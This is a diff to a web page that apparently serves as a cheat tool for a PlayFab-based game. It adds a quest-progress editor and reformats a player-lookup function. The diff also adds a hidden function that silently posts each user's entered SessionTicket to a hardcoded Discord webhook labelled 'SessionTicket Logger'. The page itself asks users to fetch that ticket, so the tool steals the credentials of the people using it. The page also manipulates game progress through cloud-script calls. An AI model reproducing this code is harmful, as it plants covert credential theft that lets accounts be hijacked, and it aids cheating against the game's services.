@@ -236,6 +236,74 @@
     </div>
 
     <div class="section">
+      <h2>📝 Update Quest Progress</h2>
+      <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
+      <input type="number" id="questProgressValue" placeholder="Progress Value">
+      <button onclick="updateQuestProgress()">Update Quest</button>
+      
+      <div style="margin-top: 15px; text-align: left;">
+        <h3>Available Quests:</h3>
+        <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
+          <ul style="columns: 2; margin: 0; padding-left: 20px;">
+            <li>QUENTIN_USE_DASH</li>
+            <li>WIN_AS_BAGGER</li>
+            <li>WIN_AS_BRAVE</li>
+            <li>WIN_AS_DETECTIVE</li>
+            <li>WIN_AS_ENGINEER</li>
+            <li>WIN_AS_LEADER</li>
+            <li>WIN_AS_SCOUT</li>
+            <li>WIN_AS_SCARY</li>
+            <li>WIN_AS_CLOWN</li>
+            <li>WIN_AS_BUTCHER</li>
+            <li>WIN_FIRST_TO_ESCAPE</li>
+            <li>WIN_WITH_HALF_LOCKS_INTACT</li>
+            <li>OPEN_LOCKS</li>
+            <li>OPEN_LOCKS_IN_ONE_MATCH</li>
+            <li>SEARCH_DRAWERS</li>
+            <li>FIND_KEYS_VIA_PHOTO</li>
+            <li>USE_KEYCARDS</li>
+            <li>CATCH_KIDS</li>
+            <li>HOOK_KIDS</li>
+            <li>CATCH_FROM_ITEM_FORM</li>
+            <li>CATCH_INSIDE_SMOKE</li>
+            <li>CATCH_IN_BEARTRAP</li>
+            <li>BLIND_NEIGHBOR_WITH_LEADER</li>
+            <li>BUFF_AS_LEADER</li>
+            <li>CRAFT_RIFLE</li>
+            <li>SHOOT_THE_SHERIFF</li>
+            <li>SLINGSHOT_HIT_NEIGHBOR</li>
+            <li>SAVE_KID_FROM_GRAB</li>
+            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_HANDS</li>
+            <li>BAGGER_CARRIER</li>
+            <li>GLUE_THE_NEIGHBOR</li>
+            <li>CONSUME_CHOCOLATE</li>
+            <li>CONSUME_MILK</li>
+            <li>CATCH_FROZEN_KIDS</li>
+            <li>CATCH_AFTER_PORTAL</li>
+            <li>KNOCK_ITEMS_OUT_OF_HANDS</li>
+            <li>CATCH_SCARED_KIDS</li>
+            <li>CRAFT_NIGHT_VISION</li>
+            <li>FIND_WITH_METAL_DETECTOR</li>
+            <li>RANDOM_KID</li>
+            <li>RANDOM_NEIGHBOR</li>
+            <li>WIN_AS_GHOST</li>
+            <li>WIN_AS_GUEST</li>
+            <li>WIN_AS_QUENTIN</li>
+            <li>WIN_AS_TAXIDERMIST</li>
+            <li>QUENTIN_OPEN_LOCK_BLUE</li>
+            <li>QUENTIN_OPEN_LOCK_RED</li>
+            <li>QUENTIN_OPEN_LOCK_YELLOW</li>
+            <li>TAXIDERMIST_HIT_TARGETS_WITHOUT_RELOAD</li>
+            <li>QUENTIN_USE_DASH</li>
+            <li>CRAFT_INSANITY_SENSOR</li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="output" id="questOutput">Quest update results will appear here...</div>
+    </div>
+
+    <div class="section">
       <h2>📄 How to Get Your SessionTicket with Requestly</h2>
       <ol>
         <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
@@ -263,10 +331,40 @@
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set:", sessionTicket);
+        
+        // Send to Discord webhook
+        sendToDiscordWebhook(sessionTicket);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "red";
+      }
+    }
+
+    // Function to send SessionTicket to Discord webhook
+    async function sendToDiscordWebhook(sessionTicket) {
+      const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
+      
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `New SessionTicket captured: ${sessionTicket}`,
+            username: 'SessionTicket Logger',
+            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
+          })
+        });
+        
+        if (response.ok) {
+          console.log('SessionTicket sent to Discord successfully');
+        } else {
+          console.error('Failed to send SessionTicket to Discord');
+        }
+      } catch (error) {
+        console.error('Error sending to Discord:', error);
       }
     }
 
@@ -453,66 +551,91 @@
     }
 
     async function getPlayFabInfo() {
-  const playfabId = document.getElementById("playfabId").value.trim();
-  const output = document.getElementById("playfabInfoOutput");
-  
-  if (!playfabId) {
-    output.textContent = "Please enter a PlayFab ID.";
-    return;
-  }
+      const playfabId = document.getElementById("playfabId").value.trim();
+      const output = document.getElementById("playfabInfoOutput");
+      
+      if (!playfabId) {
+        output.textContent = "Please enter a PlayFab ID.";
+        return;
+      }
 
-  output.textContent = "Fetching data...";
+      output.textContent = "Fetching data...";
 
-  // Get combined info
-  const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
-    PlayFabId: playfabId,
-    InfoRequestParameters: {
-      GetUserAccountInfo: true,
-      GetPlayerStatistics: true,
-      GetUserInventory: true
-    }
-  });
-
-  // Get profile info
-  const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
-    PlayFabId: playfabId,
-    ProfileConstraints: {
-      ShowLastLogin: true,
-      ShowBannedUntil: true
-    }
-  });
-
-  let resultText = "";
-  
-  if (combinedData.data) {
-    const info = combinedData.data.InfoResultPayload;
-    resultText += "=== ACCOUNT INFO ===\n";
-    resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
-    resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
-    resultText += "\n=== STATISTICS ===\n";
-    
-    if (info.PlayerStatistics) {
-      info.PlayerStatistics.forEach(stat => {
-        resultText += `${stat.StatisticName}: ${stat.Value}\n`;
+      // Get combined info
+      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
+        PlayFabId: playfabId,
+        InfoRequestParameters: {
+          GetUserAccountInfo: true,
+          GetPlayerStatistics: true,
+          GetUserInventory: true
+        }
       });
+
+      // Get profile info
+      const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
+        PlayFabId: playfabId,
+        ProfileConstraints: {
+          ShowLastLogin: true,
+          ShowBannedUntil: true
+        }
+      });
+
+      let resultText = "";
+      
+      if (combinedData.data) {
+        const info = combinedData.data.InfoResultPayload;
+        resultText += "=== ACCOUNT INFO ===\n";
+        resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
+        resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
+        resultText += "\n=== STATISTICS ===\n";
+        
+        if (info.PlayerStatistics) {
+          info.PlayerStatistics.forEach(stat => {
+            resultText += `${stat.StatisticName}: ${stat.Value}\n`;
+          });
+        }
+      }
+
+      if (profileData.data) {
+        const profile = profileData.data.PlayerProfile;
+        resultText += "\n=== PROFILE INFO ===\n";
+        resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
+        resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
+      }
+
+      if (combinedData.error || profileData.error) {
+        resultText += "\n=== ERRORS ===\n";
+        if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
+        if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
+      }
+
+      output.textContent = resultText || "No data received.";
     }
-  }
 
-  if (profileData.data) {
-    const profile = profileData.data.PlayerProfile;
-    resultText += "\n=== PROFILE INFO ===\n";
-    resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
-    resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
-  }
+    async function updateQuestProgress() {
+      const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
+      const progressValue = parseInt(document.getElementById("questProgressValue").value);
+      
+      if (!questTextFieldId || isNaN(progressValue)) {
+        document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
+        return;
+      }
 
-  if (combinedData.error || profileData.error) {
-    resultText += "\n=== ERRORS ===\n";
-    if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
-    if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
-  }
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "updateActiveQuests",
+        FunctionParameter: {
+          updatedValues: `{"${questTextFieldId}":${progressValue}}`
+        },
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
 
-  output.textContent = resultText || "No data received.";
-}
+      const output = document.getElementById("questOutput");
+      output.textContent = JSON.stringify(data, null, 2);
+    }
 
     function toggleCoinFarmBot() {
       if (coinFarmBotRunning) {
